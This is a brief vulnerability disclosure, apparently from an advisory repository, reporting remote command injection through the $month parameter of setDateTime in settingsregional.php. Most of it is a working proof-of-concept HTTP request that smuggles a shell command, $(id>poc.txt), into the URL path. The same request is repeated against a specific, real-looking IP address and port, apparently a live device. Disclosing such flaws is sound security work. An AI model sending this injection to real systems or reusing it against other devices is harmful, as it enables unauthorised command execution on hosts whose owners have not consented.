# `$month` parameter in the file `settingsregional.php` has a Remote Command Injection

### Description

The  parameter **$month** in `setDataTime` function in the file `\usr\www\application\models\settingsregional.php`  has a Remote Command Injection vulnerablilty .

`\usr\www\application\models\settingsregional.php`

### POC

```
POST /settings/setDateTime/2008/1/1$(id>poc.txt)/1/1 HTTP/1.1
Host: XXXXXXX
```

### Example 

```
POST /settings/setDateTime/2008/1/1$(id>poc.txt)/1/1 HTTP/1.1
Host: 222.103.211.89:8004
```

![image-20250317212755457](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202503172127688.png)

![image-20250317212817221](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202503172128268.png)